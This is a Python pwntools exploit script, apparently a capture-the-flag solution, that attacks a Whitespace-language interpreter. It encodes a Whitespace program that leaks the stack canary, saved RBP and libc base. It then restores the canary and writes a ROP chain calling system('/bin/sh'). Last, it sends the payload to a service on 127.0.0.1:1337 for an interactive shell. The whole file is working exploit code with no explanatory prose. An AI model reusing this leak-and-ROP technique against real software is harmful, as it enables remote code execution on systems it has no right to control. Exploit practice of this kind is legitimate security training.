from enum import Enum

from pwn import *


class I(Enum):
    STORE = "\t\t "
    RETRIEVE = "\t\t\t"
    IN_ASCII = "\t\n\t "
    IN_NUM = "\t\n\t\t"
    OUT_ASCII = "\t\n  "
    OUT_NUM = "\t\n \t"
    PUSH = "  "
    DUP = " \n "
    SWAP = " \n\t"
    POP = " \n\n"
    ADD = "\t   "
    SUB = "\t  \t"
    MULT = "\t  \n"
    DIV = "\t \t "
    MOD = "\t \t\t"
    XOR = "\t \t\n"
    END = "\n\n\n."


def NUMBER(n: int):
    out = " " if n >= 0 else "\t"
    for bit in bin(n)[2:]:
        out += " " if bit == "0" else "\t"

    return out + "\n"


def push(n):
    return [I.PUSH, NUMBER(n)]


def push_all(ls):
    out = []
    for n in ls:
        out.extend(push(n))
    return out


def heap_retrieve(offset):
    out = []
    out.extend(push(offset))
    out.append(I.RETRIEVE)
    return out


def translate(prog: list[I | str]):
    return "".join([x if type(x) is str else x.value for x in prog])


def main():
    prog = [
        # Canary leak
        *heap_retrieve(2048 + 2),
        *heap_retrieve(2048 + 3),

        # RBP leak
        *heap_retrieve(2048 + 4),
        *heap_retrieve(2048 + 5),

        # RIP leak - main+233 (not really needed, but eh)
        *heap_retrieve(2048 + 6),
        *push(0x1271 + 233),  # Subtract offset to get program base
        I.SUB,
        *heap_retrieve(2048 + 7),

        # LIBC leak - __libc_start_main+133
        *heap_retrieve(2048 + 62),
        *push(0x27280 + 133),  # Subtract offset in LIBC to get LIBC base
        I.SUB,
        *heap_retrieve(2048 + 63),

        # Padding - up to canary
        *push_all([0] * 1018),

        # Reached canary with SP, restore from leak
        *heap_retrieve(1024),
        *heap_retrieve(1024 + 1),

        # Restore RBP from leak
        *heap_retrieve(1024 + 2),
        *heap_retrieve(1024 + 3),

        # Reached return pointer, ROP chain
        # ret gadget from LIBC
        *heap_retrieve(1024 + 6),
        *push(0x277e6),
        I.ADD,
        *heap_retrieve(1024 + 7),

        # pop RDI gadget from LIBC
        *heap_retrieve(1024 + 6),
        *push(0x277e5),
        I.ADD,
        *heap_retrieve(1024 + 7),

        # "/bin/sh" address
        *heap_retrieve(1024 + 6),
        *push(0x196031),
        I.ADD,
        *heap_retrieve(1024 + 7),

        # system() address
        *heap_retrieve(1024 + 6),
        *push(0x4c490),
        I.ADD,
        *heap_retrieve(1024 + 7),

        # End program
        I.END,
    ]

    translated = translate(prog)

    # Output for debugging
    with open("exploit.ws", "w") as f:
        f.write(translated)

    #with process("./interpret") as io:
    with remote("127.0.0.1", 1337) as io:
        io.recvline()
        io.send(translated.encode())
        io.interactive()


if __name__ == "__main__":
    main()
